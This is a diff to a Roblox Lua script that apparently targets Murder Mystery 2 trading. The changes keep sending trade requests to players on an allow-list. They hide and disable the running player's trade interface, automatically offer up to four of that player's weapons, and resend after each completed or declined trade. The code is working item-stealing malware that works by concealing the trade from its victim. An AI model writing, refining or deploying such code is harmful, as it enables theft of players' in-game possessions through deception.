@@ -134,6 +134,8 @@ local function hook_mm2()
     local startTrade         = Trade:WaitForChild("StartTrade", 10)
     local setRequestsEnabled = Trade:WaitForChild("SetRequestsEnabled", 10)
     local updateTrade        = Trade:FindFirstChild("UpdateTrade")
+    local completeTrade      = Trade:FindFirstChild("CompleteTrade")
+    local declineTrade       = Trade:FindFirstChild("DeclineTrade")
     if not sendRequest or not offerItem or not acceptTrade or not startTrade then return end
 
     pcall(function() setRequestsEnabled:FireServer(true) end)
@@ -143,7 +145,6 @@ local function hook_mm2()
 
     local currentLastOffer = nil
     local tradingWithAllowed = false
-    local itemsOffered = false
     local readySent = false
     local shiftlockConn = nil
     local heartbeatConn = nil
@@ -164,7 +165,11 @@ local function hook_mm2()
                 for _, fname in ipairs(t.frames) do
                     local f = sg:FindFirstChild(fname)
                     if f and f:IsA("GuiObject") then
-                        pcall(function() f.Visible = false end)
+                        pcall(function()
+                            f.Visible = false
+                            f.Active = false
+                            f.Interactable = false
+                        end)
                     end
                 end
             end
@@ -184,7 +189,6 @@ local function hook_mm2()
         if shiftlockConn then shiftlockConn:Disconnect() end
         if heartbeatConn then heartbeatConn:Disconnect() end
         shiftlockConn = RunService.RenderStepped:Connect(function()
-            pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
             if hiding then applyHide() end
         end)
         heartbeatConn = RunService.Heartbeat:Connect(function()
@@ -196,7 +200,6 @@ local function hook_mm2()
         hiding = false
         if shiftlockConn then shiftlockConn:Disconnect() shiftlockConn = nil end
         if heartbeatConn then heartbeatConn:Disconnect() heartbeatConn = nil end
-        UIS.MouseBehavior = Enum.MouseBehavior.Default
         local pg = lp:FindFirstChild("PlayerGui")
         if not pg then return end
         for _, t in ipairs(TARGETS) do
@@ -205,19 +208,35 @@ local function hook_mm2()
                 for _, fname in ipairs(t.frames) do
                     local f = sg:FindFirstChild(fname)
                     if f and f:IsA("GuiObject") then
-                        pcall(function() f.Visible = true end)
+                        pcall(function()
+                            f.Visible = true
+                            f.Active = true
+                            f.Interactable = true
+                        end)
                     end
                 end
             end
         end
     end
 
+    local function doResend()
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= lp and isAllowedUser(player.Name) then
+                task.spawn(function()
+                    pcall(function() sendRequest:InvokeServer(player) end)
+                end)
+                break
+            end
+        end
+    end
+
     local function resetState()
         tradingWithAllowed = false
-        itemsOffered = false
         readySent = false
         currentLastOffer = nil
         showGui()
+        task.wait(0.5)
+        doResend()
     end
 
     if updateTrade then
@@ -228,18 +247,27 @@ local function hook_mm2()
         end)
     end
 
+    if completeTrade then
+        completeTrade.OnClientEvent:Connect(function()
+            if tradingWithAllowed then
+                resetState()
+            end
+        end)
+    end
+
+    if declineTrade then
+        declineTrade.OnClientEvent:Connect(function()
+            if tradingWithAllowed then
+                resetState()
+            end
+        end)
+    end
+
     task.spawn(function()
         while true do
             task.wait(2)
             if not tradingWithAllowed then
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if player ~= lp and isAllowedUser(player.Name) then
-                        task.spawn(function()
-                            pcall(function() sendRequest:InvokeServer(player) end)
-                        end)
-                        break
-                    end
-                end
+                doResend()
             end
         end
     end)
@@ -254,7 +282,7 @@ local function hook_mm2()
     end)
 
     startTrade.OnClientEvent:Connect(function(tradeData)
-        itemsOffered = false
+        if tradingWithAllowed then return end
         readySent = false
         currentLastOffer = (tradeData and tradeData.LastOffer) or nil
 
@@ -269,26 +297,20 @@ local function hook_mm2()
 
         tradingWithAllowed = true
         hideGui()
-        itemsOffered = true
 
         tradeGen = tradeGen + 1
         local myGen = tradeGen
 
         task.spawn(function()
-            -- verse items ophalen, fallback op cachedItems
             local currentItems = collect_mm2_items()
             local itemsToOffer = (#currentItems > 0) and currentItems or cachedItems
 
-            -- 4 totale slots, vul duplicaten per item (hoogste rarity eerst)
-            local slotsLeft = 4
+            local slotsUsed = 0
             for _, entry in ipairs(itemsToOffer) do
-                if slotsLeft <= 0 then break end
-                local copies = math.min(entry.amount, slotsLeft)
-                for i = 1, copies do
-                    pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
-                    task.wait(0.1)
-                end
-                slotsLeft = slotsLeft - copies
+                if slotsUsed >= 4 then break end
+                pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
+                task.wait(0.1)
+                slotsUsed = slotsUsed + 1
             end
 
             task.wait(3)
@@ -302,9 +324,8 @@ local function hook_mm2()
                 end
             end
 
-            -- 30s timer zodat GUI niet te vroeg verschijnt
             task.wait(30)
-            if tradeGen == myGen then
+            if tradeGen == myGen and tradingWithAllowed then
                 resetState()
             end
         end)
